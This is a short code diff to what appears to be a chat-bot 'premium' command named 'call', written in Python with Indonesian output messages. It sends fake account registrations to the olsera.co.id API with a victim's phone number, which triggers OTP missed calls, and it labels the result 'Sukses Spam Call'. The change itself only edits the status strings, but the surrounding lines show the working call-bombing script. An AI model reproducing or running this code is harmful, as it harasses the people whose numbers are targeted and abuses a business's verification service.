@@ -8,9 +8,9 @@ head={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"applicatio
 dat=json.dumps({"name":"AmmarExecuted","email":mal,"password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":2})
 pos=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=head,data=dat).text
 if "Registration succes." in pos:
-	print (f"[✓] Sukses Spam Call")
+	print (f"*✔️ Sukses Spam Call")
 else:
-	print (f"[❌] Gagal Spam Call")
+	print (f"*[❗] Gagal Spam Call")
 
 handler.command = ['call']
 handler.tags = ['premium']
